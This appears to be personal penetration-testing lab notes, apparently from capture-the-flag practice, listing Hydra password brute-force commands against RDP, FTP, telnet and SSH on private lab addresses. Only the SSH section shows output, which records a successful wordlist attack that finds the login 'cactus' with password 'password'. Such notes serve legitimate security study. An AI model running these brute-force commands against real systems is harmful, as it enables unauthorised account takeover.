## RDP

```bash
banister@~/projects/OreshicRecord kali$ hydra -L ./user.txt -P ./pass.txt rdp://10.129.71.163 -s 3389 -f
```

```
```

## FTP

```bash
banister@~/projects/OreshicRecord kali$ hydra -L ./user.txt -P ./pass.txt ftp://10.129.71.163 -f
```

```
```

## telnet

```bash
banister@~/projects/OreshicRecord kali$ hydra -L ./user.txt -P ./pass.txt telnet://10.129.71.163 -f
```

```
```

## ssh

```bash
banister@~/projects/oscp/thm Tinkpad$ hydra -l username -P /usr/share/wordlists/john.lst ssh://10.49.170.179 -s 22 -f
```

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-09 08:11:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3559 login tries (l:1/p:3559), ~223 tries per task
[DATA] attacking ssh://10.49.170.179:22/
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: This list has been compiled by Solar Designer of Openwall Project" - 1 of 3559 [child 0] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: in 1996 through 2011.  It is assumed to be in the public domain." - 2 of 3559 [child 1] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment:" - 3 of 3559 [child 2] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: This list is based on passwords most commonly seen on a set of Unix" - 4 of 3559 [child 3] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: systems in mid-1990's, sorted for decreasing number of occurrences" - 5 of 3559 [child 4] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: (that is, more common passwords are listed first).  It has been" - 6 of 3559 [child 5] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: revised to also include common website passwords from public lists" - 7 of 3559 [child 6] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: of "top N passwords" from major community website compromises that" - 8 of 3559 [child 7] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: occurred in 2006 through 2010." - 9 of 3559 [child 8] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment:" - 10 of 3559 [child 9] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: Last update: 2011/11/20 (3546 entries)" - 11 of 3559 [child 10] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment:" - 12 of 3559 [child 11] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "#!comment: For more wordlists, see https://www.openwall.com/wordlists/" - 13 of 3559 [child 12] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "123456" - 14 of 3559 [child 13] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "12345" - 15 of 3559 [child 14] (0/0)
[ATTEMPT] target 10.49.170.179 - login "cactus" - pass "password" - 16 of 3559 [child 15] (0/0)
[22][ssh] host: 10.49.170.179   misc: (null)   login: cactus   password: password
[STATUS] attack finished for 10.49.170.179 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-09 08:11:19
```

